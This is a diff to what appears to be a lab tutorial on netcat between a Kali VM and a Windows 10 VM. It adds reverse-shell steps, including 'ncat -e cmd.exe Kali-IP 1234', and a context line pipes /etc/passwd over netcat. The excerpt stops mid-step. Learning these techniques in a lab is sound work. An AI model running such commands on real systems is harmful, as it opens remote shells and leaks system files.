@@ -161,8 +161,17 @@ nc Win10-IP 8082 < /etc/passwd
 10. Check the contents of `newfile.txt` on Win10 VM
 
 <u>Creating  a reverse shell:</u>
-1. Run netcat to connect to the listening netcat on Win10 on port 8989
+**On Kali VM**
+1. Run netcat to connect to the listening netcat on Win10 on port 1234
 ```
-nc Win10-IP 8989
+nc Win10-IP 1234
 ```
-2. 
+
+**On Win10 VM**
+2. Run netcat to connect to the listening port on Kali on port 1234 and execute the command shell
+```
+ncat -e cmd.exe Kali-IP 1234
+```
+
+**On Kali VM**
+3. Access 
